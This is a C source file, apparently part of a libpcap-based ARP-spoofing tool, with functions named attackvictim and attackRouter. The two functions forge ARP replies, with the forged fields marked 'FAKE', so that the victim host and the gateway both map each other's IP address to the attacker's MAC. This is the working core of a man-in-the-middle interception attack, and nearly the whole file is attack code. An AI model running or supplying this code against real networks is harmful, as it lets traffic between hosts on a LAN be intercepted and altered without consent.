#include "myHeader.h"

int setArpHeader(PARP_HEADER arpHeader)
{
	arpHeader->Hardware_type = ntohs(0x0001);
	arpHeader->Protocol_type = ntohs(0x0800);
	arpHeader->Hardware_size = 0x06;
	arpHeader->Protocol_size = 0x04;
	arpHeader->Opcode = ntohs(0x0002); // reply
	return 0;
}
int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
{
	u_char packet[ARPSIZE + ETHERNETSIZE];
	/* set header */
	memcpy(arpPacket->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->arp.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
	memcpy(arpPacket->arp.src_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));		// FAKE
	memcpy(arpPacket->arp.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->arp.dst_IP, &LanInfo->victimIP, sizeof(IN_ADDR));
	/* fill Pacekt */
	memcpy(packet, &(arpPacket->ethernet), sizeof(char) * ETHERNETSIZE);
	memcpy(packet + ETHERNETSIZE, &(arpPacket->arp), sizeof(char) * ARPSIZE);
	/* send to victim */
	if (pcap_sendpacket(handle, packet, ARPSIZE + ETHERNETSIZE) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}
	return 0;
}
int attackRouter(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
{
	u_char packet[ARPSIZE + ETHERNETSIZE];
	/* set header */
	memcpy(arpPacket->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->arp.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);	// FAKE
	memcpy(arpPacket->arp.src_IP, &LanInfo->victimIP, sizeof(IN_ADDR));		// FAKE
	memcpy(arpPacket->arp.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	memcpy(arpPacket->arp.dst_IP, &LanInfo->gatewayIP, sizeof(IN_ADDR));
	/* fill Pacekt */
	memcpy(packet, &(arpPacket->ethernet), sizeof(char) * ETHERNETSIZE);
	memcpy(packet + ETHERNETSIZE, &(arpPacket->arp), sizeof(char) * ARPSIZE);
	/* send to router */
	if (pcap_sendpacket(handle, packet, ARPSIZE + ETHERNETSIZE) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
		return 0;
	}
	return 0;
}